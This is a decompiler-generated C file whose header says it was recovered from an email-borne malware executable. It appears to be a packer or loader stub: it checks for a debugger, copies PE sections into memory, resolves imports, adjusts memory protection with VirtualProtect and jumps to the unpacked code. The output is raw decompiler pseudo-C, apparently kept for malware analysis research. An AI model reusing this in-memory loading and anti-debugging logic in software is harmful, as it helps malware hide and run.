// subject.c
// Generated on 5/4/2015 1:14:58 AM by decompiling malware_via_email/malware_0512/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

word32 fn003E1000(word32 dwArg04)
{
	return dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
}

void fn003E101F(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	fn003E1942(dwArg08, dwArg04, dwArg0C);
	VirtualProtect(dwArg08, dwArg0C, 0x00000002, fp - 0x00000008);
	return;
}

word32 fn003E10B0(word32 ebp, word32 dwArg08, ptr32 ebpOut)
{
	word32 eax_37;
	Mem19[fp - 0x0000000C:word32] = GetProcAddress(Mem0[fp + 0x00000000:word32], Mem0[fp + 0x00000008:word32]);
	word32 ebp_38 = fp - 0x00000008;
	if (fn003E1A30(Mem19[fp + 0x00000004:word32], 0x003E2030) == 0x00000000)
	{
		Mem52[fp - 0x0000000C:word32] = 0x003E2040;
		if (fn003E19AF(dwLoc14, dwArg08, out ebp_38) == 0x00000000)
		{
			Mem67[fp - 0x0000000C:word32] = Mem52[ebp_38 - 0x00000004:word32];
			Mem70[0x003E8810:word32] = Mem67[fp - 0x0000000C:word32];
			Mem72[fp - 0x0000000C:word32] = 0x003E1050;
			eax_37 = Mem72[fp - 0x0000000C:word32];
		}
		else
		{
			Mem76[fp - 0x0000000C:word32] = 0x003E2054;
			Mem78[fp - 0x00000010:word32] = Mem76[ebp_38 + 0x00000010:word32];
			if (fn003E19AF(ebp, dwArg00, out ebp_38) == 0x00000000)
			{
				Mem90[fp - 0x0000000C:word32] = Mem78[ebp_38 - 0x00000004:word32];
				Mem93[0x003E8814:word32] = Mem90[fp - 0x0000000C:word32];
				eax_37 = 0x003E1081;
			}
			else
			{
l003E111D:
				eax_37 = Mem19[ebp_38 - 0x00000004:word32];
			}
		}
	}
	else
		goto l003E111D;
	word32 ebp_40;
	*ebpOut = Mem19[ebp_38 + 0x00000000:word32];
	return eax_37;
}

byte fn003E1122()
{
	return (byte) -(0x00000000 - (-(Mem0[fp + 0x00000000:word32] & 0x80000000) == 0x00000000));
}

word32 fn003E1136(word32 ebp)
{
	Mem14[0x003E8818:word32] = GetModuleHandleA(0x00000000);
	Mem19[0x003E881C:word32] = Mem14[fp + 0x00000004:word32];
	Mem22[fp - 0x00000010:word32] = Mem19[fp + 0x00000000:word32] + 0x00000080;
	Mem30[fp - 0x0000000C:word32] = Mem22[fp + 0x00000004:word32] + Mem22[Mem22[fp - 0x00000010:word32]:word32];
	word32 ebp_111 = fp - 0x00000008;
	word32 esp_177 = fp - 0x00000028;
	word32 esp_42 = esp_177 - 0x00000004;
	Mem43[esp_42 + 0x00000000:word32] = Mem30[ebp_111 - 0x00000004:word32];
	while (Mem43[Mem43[esp_42 + 0x00000000:word32] + 0x0000000C:word32] != 0x00000000)
	{
		word32 esp_185;
		Mem49[ebp_111 - 0x0000000C:word32] = Mem43[ebp_111 - 0x0000000C:word32] & 0x00000000;
		Mem52[ebp_111 - 0x00000010:word32] = Mem49[ebp_111 - 0x00000010:word32] & 0x00000000;
		Mem55[esp_42 + 0x00000000:word32] = Mem52[ebp_111 - 0x00000004:word32];
		word32 eax_56 = Mem55[esp_42 + 0x00000000:word32];
		Mem59[esp_42 + 0x00000000:word32] = Mem55[ebp_111 + 0x0000000C:word32];
		Mem63[ebp_111 - 0x0000001C:word32] = Mem59[esp_42 + 0x00000000:word32] + Mem59[eax_56 + 0x0000000C:word32];
		Mem65[esp_42 + 0x00000000:word32] = Mem63[ebp_111 - 0x0000001C:word32];
		Mem68[ebp_111 - 0x00000018:word32] = LoadLibraryA(Mem65[esp_42 + 0x00000000:LPCSTR]);
		if (Mem68[Mem68[ebp_111 - 0x00000004:word32] + 0x00000004:word32] == 0x00000000)
		{
			word32 eax_181 = Mem68[ebp_111 - 0x00000004:word32];
			Mem183[esp_42 + 0x00000000:word32] = Mem68[ebp_111 + 0x0000000C:word32];
			Mem188[ebp_111 - 0x0000000C:word32] = Mem183[esp_42 + 0x00000000:word32] + Mem183[eax_181 + 0x00000010:word32];
			esp_185 = esp_42 + 0x00000004;
		}
		else
		{
			word32 eax_189 = Mem68[ebp_111 - 0x00000004:word32];
			Mem191[esp_42 + 0x00000000:word32] = Mem68[ebp_111 + 0x0000000C:word32];
			Mem196[ebp_111 - 0x0000000C:word32] = Mem191[esp_42 + 0x00000000:word32] + Mem191[eax_189 + 0x00000000:word32];
			esp_185 = esp_42 + 0x00000004;
		}
		word32 esp_73 = esp_185 - 0x00000004;
		Mem74[esp_73 + 0x00000000:word32] = Mem68[ebp_111 - 0x00000004:word32];
		word32 eax_75 = Mem74[esp_73 + 0x00000000:word32];
		Mem78[esp_73 + 0x00000000:word32] = Mem74[ebp_111 + 0x0000000C:word32];
		Mem83[ebp_111 - 0x00000014:word32] = Mem78[esp_73 + 0x00000000:word32] + Mem78[eax_75 + 0x00000010:word32];
		word32 esp_125 = esp_73 + 0x00000004;
		while (Mem83[Mem83[ebp_111 - 0x0000000C:word32]:word32] != 0x00000000)
		{
			word32 esp_115;
			word32 esp_94 = esp_125 - 0x00000004;
			Mem95[esp_94 + 0x00000000:word32] = Mem83[ebp_111 - 0x00000018:word32];
			Mem97[esp_94 - 0x00000004:word32] = Mem95[ebp_111 - 0x0000000C:word32];
			Mem101[esp_94 - 0x00000004:word32] = Mem97[Mem97[esp_94 - 0x00000004:word32]:word32];
			if ((word32) fn003E1122() != 0x00000000)
			{
				Mem130[esp_94 + 0x00000000:word32] = Mem101[ebp_111 - 0x0000000C:word32];
				Mem134[esp_94 + 0x00000000:word32] = Mem130[Mem130[esp_94 + 0x00000000:word32]:word32];
				Mem141[ebp_111 - 0x00000020:word16] = (word16) (Mem134[esp_94 + 0x00000000:word32] & 0x0000FFFF);
				Mem144[esp_94 + 0x00000000:word32] = (word32) Mem141[ebp_111 - 0x00000020:word16];
				Mem146[esp_94 - 0x00000004:word32] = Mem144[ebp_111 - 0x00000018:word32];
				Mem149[ebp_111 - 0x00000010:word32] = GetProcAddress(Mem146[esp_94 - 0x00000004:HMODULE], Mem146[esp_94 + 0x00000000:LPCSTR]);
				esp_115 = esp_94 + 0x00000004;
			}
			else
			{
				Mem151[esp_94 + 0x00000000:word32] = Mem101[ebp_111 - 0x0000000C:word32];
				Mem157[ebp_111 - 0x00000024:word32] = Mem151[ebp_111 + 0x0000000C:word32] + Mem151[Mem151[esp_94 + 0x00000000:word32]:word32];
				Mem163[esp_94 + 0x00000000:word32] = Mem157[ebp_111 - 0x00000024:word32] + 0x00000002;
				Mem165[esp_94 - 0x00000004:word32] = Mem163[ebp_111 - 0x0000001C:word32];
				Mem167[esp_94 - 0x00000008:word32] = Mem165[ebp_111 - 0x00000018:word32];
				word32 eax_170 = fn003E10B0(ebp_111, dwArg04, out ebp_111);
				Mem173[ebp_111 - 0x00000010:word32] = eax_170;
				esp_115 = esp_94 + 0x00000004;
			}
			Mem118[Mem101[ebp_111 - 0x00000014:word32]:word32] = Mem101[ebp_111 - 0x00000010:word32];
			Mem121[ebp_111 - 0x00000014:word32] = Mem118[ebp_111 - 0x00000014:word32] + 0x00000004;
			word32 esp_122 = esp_115 - 0x00000004;
			Mem123[esp_122 + 0x00000000:word32] = Mem121[ebp_111 - 0x0000000C:word32];
			Mem128[ebp_111 - 0x0000000C:word32] = Mem123[esp_122 + 0x00000000:word32] + 0x00000004;
			esp_125 = esp_122 + 0x00000004;
		}
		word32 esp_174 = esp_125 - 0x00000004;
		Mem175[esp_174 + 0x00000000:word32] = Mem83[ebp_111 - 0x00000004:word32];
		Mem180[ebp_111 - 0x00000004:word32] = Mem175[esp_174 + 0x00000000:word32] + 0x00000014;
		esp_177 = esp_174 + 0x00000004;
		esp_42 = esp_177 - 0x00000004;
		Mem43[esp_42 + 0x00000000:word32] = Mem30[ebp_111 - 0x00000004:word32];
	}
	return Mem43[ebp_111 + 0x00000000:word32];
}

void fn003E1270(word32 ecx, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	do
	{
		if (ReadFile(dwArg04, dwArg08, dwArg0C - (ecx & 0x00000000), fp - 0x00000008, 0x00000000) == 0x00000000)
			goto l003E12A4;
		Mem49[fp - 0x0000000C:word32] = ecx & 0x00000000;
	} while (0x00000000 != dwArg0C);
l003E12A4:
	return;
}

word32 fn003E12A6(word32 dwArg00, word32 dwArg04, word32 dwArg08)
{
	Mem14[fp - 0x0000000C:word32] = Mem0[fp - 0x0000000C:word32] & 0x00000000;
	do
		if (WriteFile(dwArg00, dwArg04, dwArg08, fp - 0x0000000C, 0x00000000) == 0x00000000)
			goto l003E12DA;
	while (0x00000000 != dwArg08);
l003E12DA:
	return ecx;
}

void fn003E12DC(word32 ecx, word32 ebp)
{
	word32 ebp_13 = fp - 0x00000004;
	word32 esp_15 = fp - 0x00000008;
	word32 esp_17 = esp_15 - 0x00000004;
	Mem19[esp_17 + 0x00000000:word32] = Mem0[ebp_13 - 0x00000004:word32];
	while (Mem19[esp_17 + 0x00000000:word32] <u Mem19[ebp_13 + 0x00000010:word32])
	{
		Mem25[esp_17 + 0x00000000:word32] = 0x00000008;
		Mem30[esp_17 - 0x00000004:word32] = Mem25[ebp_13 + 0x0000000C:word32] + Mem25[ebp_13 - 0x00000004:word32] * 0x00000004;
		Mem33[esp_17 - 0x00000008:word32] = Mem30[Mem30[ebp_13 + 0x00000008:word32] + 0x00000004:word32];
		ebp_13 = fn003E12A6(ebp, dwArg00, dwArg04);
		Mem40[esp_17 + 0x00000000:word32] = 0x00000008;
		Mem42[esp_17 - 0x00000004:word32] = Mem40[ebp_13 - 0x00000004:word32];
		word32 ecx_45 = Mem42[ebp_13 + 0x0000000C:word32];
		Mem48[esp_17 - 0x00000004:word32] = ecx_45 + Mem42[esp_17 - 0x00000004:word32] * 0x00000004;
		Mem50[esp_17 - 0x00000008:word32] = Mem48[ebp_13 + 0x00000008:word32];
		Mem54[esp_17 - 0x00000008:word32] = Mem50[Mem50[esp_17 - 0x00000008:word32]:word32];
		fn003E1270(ecx_45, dwArg00, dwArg04, dwArg08);
		esp_15 = esp_17 + 0x00000004;
		Mem62[ebp_13 - 0x00000004:word32] = Mem54[ebp_13 - 0x00000004:word32] + 0x00000002;
		esp_17 = esp_15 - 0x00000004;
		Mem19[esp_17 + 0x00000000:word32] = Mem0[ebp_13 - 0x00000004:word32];
	}
	return;
}

void fn003E141E()
{
	CloseHandle(Mem0[Mem0[fp + 0x00000000:word32]:word32]);
	CloseHandle(Mem0[Mem0[fp + 0x00000000:word32] + 0x00000004:word32]);
	return;
}

word32 fn003E143B(word32 ecx, word32 ebp, selector fs)
{
	word32 eax_151;
	if ((word32) Mem0[Mem0[fn003E15D0(fs) + 0x00000030:word32] + 0x00000002:byte] != 0x00000000)
		eax_151 = 0x00000000;
	else
	{
		Mem51[0x0040FC7D:word32] = 0x0000455D;
		Mem52[0x0040FC81:word32] = 0x0000371C;
		Mem53[0x0040FC85:word32] = 0x0000582C;
		Mem54[0x0040FC89:word32] = 0x000020CD;
		word32 v9_55 = Mem54[0x0040FC89:word32] + 0x00004B37;
		Mem56[0x0040FC89:word32] = v9_55;
		if (CreatePipe(fp - 0x00000024, fp - 0x00000014, 0x00000000, 0x00000010) == 0x00000000)
			eax_151 = 0x00000000;
		else
		{
			Mem76[fp - 0x00000038:word32] = 0x00000010;
			Mem78[fp - 0x0000003C:word32] = 0x00000000;
			if (CreatePipe(fp - 0x00000018, fp - 0x00000020, 0x00000000, 0x00000010) == 0x00000000)
				eax_151 = 0x00000000;
			else
			{
				Mem95[fp - 0x00000038:word32] = fp - 0x0000000C;
				Mem97[fp - 0x0000003C:word32] = 0x00000000;
				CreateThread(0x00000000, 0x00000000, 0x003E1330, fp - 0x00000024, 0x00000000, 0x00000010);
				Mem114[fp - 0x00000038:word32] = Mem97[0x003E8803:word32] >>u 0x00000002;
				Mem116[fp - 0x0000003C:word32] = 0x003E3000;
				fn003E12DC(ecx, fp - 0x00000004);
				Mem124[fp - 0x00000038:word32] = fp - 0x00000018;
				fn003E141E();
				Mem129[fp - 0x00000038:word32] = fp - 0x00000024;
				fn003E141E();
				Mem133[fp - 0x00000038:word32] = Mem129[fp - 0x00000028:word32];
				CloseHandle(Mem133[fp - 0x00000038:HANDLE]);
				Mem137[fp - 0x00000038:word32] = 0x003E3000;
				Mem142[fp - 0x00000010:word32] = fn003E1000(dwArg00);
				if (Mem142[fp - 0x00000010:word32] != 0x00000000)
				{
					Mem155[fp - 0x00000038:word32] = Mem142[fp - 0x00000010:word32];
					Mem159[fp - 0x00000030:word32] = Mem155[Mem155[fp - 0x00000038:word32] + 0x00000034:word32];
					Mem162[fp - 0x00000038:word32] = Mem159[Mem159[fp - 0x00000010:word32] + 0x00000054:word32];
					Mem164[fp - 0x0000003C:word32] = Mem162[fp - 0x00000030:word32];
					Mem166[fp - 0x00000040:word32] = 0x003E3000;
					fn003E101F(dwArg00, dwArg04, dwArg08);
					Mem172[fp - 0x00000038:word32] = Mem166[fp - 0x00000030:word32];
					Mem174[fp - 0x0000003C:word32] = 0x003E3000;
					Mem176[fp - 0x00000040:word32] = Mem174[fp - 0x00000010:word32];
					word32 ebp_177 = fn003E15E0(dwArg00, dwArg04);
					Mem181[fp - 0x00000038:word32] = Mem176[ebp_177 - 0x0000002C:word32];
					Mem185[ebp_177 - 0x00000028:word32] = fn003E1000(dwArg00);
					if (Mem185[ebp_177 - 0x00000028:word32] != 0x00000000)
					{
						Mem189[fp - 0x00000038:word32] = Mem185[ebp_177 - 0x0000002C:word32];
						Mem191[fp - 0x0000003C:word32] = Mem189[ebp_177 - 0x00000028:word32];
						word32 ebp_192 = fn003E1136(ebp_177);
						Mem198[fp - 0x00000038:word32] = Mem191[ebp_192 - 0x0000002C:word32];
						Mem200[fp - 0x0000003C:word32] = Mem198[ebp_192 - 0x00000028:word32];
						word32 ebp_201 = fn003E1776(dwArg00);
						word32 eax_206 = Mem200[ebp_201 - 0x00000018:word32];
						Mem208[fp - 0x00000038:word32] = Mem200[ebp_201 - 0x0000002C:word32];
						Mem211[eax_206 + 0x00000008:word32] = Mem208[fp - 0x00000038:word32];
						word32 eax_212 = Mem211[ebp_201 - 0x0000000C:word32];
						Mem214[fp - 0x00000038:word32] = Mem211[ebp_201 - 0x0000002C:word32];
						word32 ecx_217 = Mem214[fp - 0x00000038:word32] + Mem214[eax_212 + 0x00000028:word32];
						Mem219[ebp_201 - 0x00000030:word32] = ecx_217;
						Mem219[ebp_201 - 0x00000030:word32]();
					}
				}
				eax_151 = 0x00000000;
			}
		}
	}
	return eax_151;
}

void fn003E15B5(word32 ecx, selector fs)
{
	Mem11[fp - 0x00000008:word32] = fn003E143B(ecx, fp - 0x00000004, fs);
	Mem13[fp - 0x0000000C:word32] = Mem11[fp - 0x00000008:word32];
	ExitProcess(Mem13[fp - 0x0000000C:UINT]);
	return;
}

word32 fn003E15D0(selector fs)
{
	return Mem0[fs:0x00000018:word32];
}

word32 fn003E15E0(word32 dwArg04, word32 dwArg08)
{
	Mem16[fp - 0x00000014:word32] = Mem0[fp + 0x00000000:word32] + 0x000000F8;
	Mem19[fp - 0x00000010:word16] = Mem16[Mem16[fp + 0x00000000:word32] + 0x00000006:word16];
	Mem24[fp - 0x0000000C:word32] = Mem19[fp - 0x00000014:word32];
	Mem26[fp - 0x00000018:word16] = Mem24[fp - 0x00000018:word16] & 0x0000;
	while ((word32) wLoc18 < (word32) wLoc10)
	{
		word32 dwLoc30_119;
		word32 eax_60 = Mem26[(word32) wLoc18 *s 0x00000028 + 0x00000008 + dwLoc0C:word32];
		word32 dwLoc30_69 = Mem26[(word32) wLoc18 *s 0x00000028 + 0x00000010 + dwLoc0C:word32];
		if (eax_60 <u dwLoc30_69)
			dwLoc30_119 = eax_60;
		else
			dwLoc30_119 = dwLoc30_69;
		fn003E1942(dwArg08 + Mem26[((word32) wLoc18 *s 0x00000028 + 0x0000000C) + dwLoc0C:word32], dwArg04 + Mem26[((word32) wLoc18 *s 0x00000028 + 0x00000014) + dwLoc0C:word32], dwLoc30_119);
		wLoc18 = wLoc18 + 0x0001;
	}
	return fp - 0x00000008;
}

word32 fn003E16AB(word32 ecx, word32 dwArg04)
{
	word32 dwLoc08_10 = ecx & 0x00000000;
	if ((dwArg04 & 0x04000000) != 0x00000000)
		dwLoc08_10 = ecx & 0x00000000 | 0x00000200;
	word32 dwLoc08_110;
	if ((dwArg04 & 0x20000000) == 0x00000000)
		if ((dwArg04 & 0x40000000) == 0x00000000)
			if ((dwArg04 & 0x80000000) != 0x00000000)
				dwLoc08_110 = dwLoc08_10 | 0x00000008;
			else
				dwLoc08_110 = dwLoc08_10 | 0x00000001;
		else if ((dwArg04 & 0x80000000) != 0x00000000)
			dwLoc08_110 = dwLoc08_10 | 0x00000004;
		else
			dwLoc08_110 = dwLoc08_10 | 0x00000002;
	else if ((dwArg04 & 0x40000000) == 0x00000000)
		if ((dwArg04 & 0x80000000) != 0x00000000)
			dwLoc08_110 = dwLoc08_10 | 0x00000080;
		else
			dwLoc08_110 = dwLoc08_10 | 0x00000010;
	else if ((dwArg04 & 0x80000000) != 0x00000000)
		dwLoc08_110 = dwLoc08_10 | 0x00000040;
	else
		dwLoc08_110 = dwLoc08_10 | 0x00000020;
	return dwLoc08_110;
}

word32 fn003E1776(word32 dwArg04)
{
	Mem16[fp - 0x00000014:word32] = Mem0[fp + 0x00000000:word32] + 0x000000F8;
	Mem19[fp - 0x00000010:word16] = Mem16[Mem16[fp + 0x00000000:word32] + 0x00000006:word16];
	Mem24[fp - 0x0000000C:word32] = Mem19[fp - 0x00000014:word32];
	Mem26[fp - 0x00000018:word16] = Mem24[fp - 0x00000018:word16] & 0x0000;
	while ((word32) wLoc18 < (word32) wLoc10)
	{
		VirtualProtect(dwArg04 + Mem26[((word32) wLoc18 *s 0x00000028 + 0x0000000C) + dwLoc0C:word32], fp - 0x0000001C, fn003E16AB(dwLoc0C, Mem26[(word32) wLoc18 *s 0x00000028 + 0x00000024 + dwLoc0C:word32]), fp - 0x0000001C);
		wLoc18 = wLoc18 + 0x0001;
	}
	return fp - 0x00000008;
}

word32 fn003E1810(word32 dwArg04)
{
	word32 eax_12;
	if (dwArg04 >= 0x00000041 && dwArg04 <= 0x0000005A)
		eax_12 = dwArg04 + 0x00000020;
	else
		eax_12 = dwArg04;
	return eax_12;
}

void fn003E1942(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	dwArg0C = dwArg0C - 0x00000001;
	while (dwArg0C != 0x00000000)
	{
		Mem36[dwArg04 + 0x00000000:byte] = Mem0[dwArg08 + 0x00000000:byte];
		dwArg04 = dwArg04 + 0x00000001;
		dwArg08 = dwArg08 + 0x00000001;
		dwArg0C = dwArg0C - 0x00000001;
	}
	return;
}

word32 fn003E19AF(word32 dwArg00, word32 dwArg04, ptr32 ebpOut)
{
	Mem14[fp - 0x0000000C:word32] = Mem0[fp - 0x0000000C:word32] & 0x00000000;
	word32 eax_28 = (word32) Mem14[dwArg00 + 0x00000000:byte] - (word32) Mem14[dwArg04 + 0x00000000:byte];
	word32 dwLoc0C_31 = eax_28;
	while (eax_28 == 0x00000000)
	{
		dwLoc0C_31 = dwArg04;
		if ((int32) Mem14[dwArg04 + 0x00000000:byte] == 0x00000000)
			break;
		dwArg00 = dwArg00 + 0x00000001;
		dwArg04 = dwArg04 + 0x00000001;
		eax_28 = (word32) Mem14[dwArg00 + 0x00000000:byte] - (word32) Mem14[dwArg04 + 0x00000000:byte];
		dwLoc0C_31 = eax_28;
	}
	if (dwLoc0C_31 < 0x00000000)
		dwLoc0C_31 = dwLoc0C_31 | 0xFFFFFFFF;
	else if (dwLoc0C_31 > 0x00000000)
		dwLoc0C_31 = 0x00000001;
	word32 ebp_46;
	*ebpOut = ecx;
	return dwLoc0C_31;
}

word32 fn003E1A30(word32 dwArg04, word32 dwArg08)
{
	do
	{
		word32 eax_18 = fn003E1810((word32) Mem0[dwArg04 + 0x00000000:byte]);
		dwArg04 = dwArg04 + 0x00000001;
		word32 eax_37 = fn003E1810((word32) Mem0[dwArg08 + 0x00000000:byte]);
		dwArg08 = dwArg08 + 0x00000001;
	} while (eax_18 == 0x00000000 || eax_18 != eax_37);
	return eax_18 - eax_37;
}

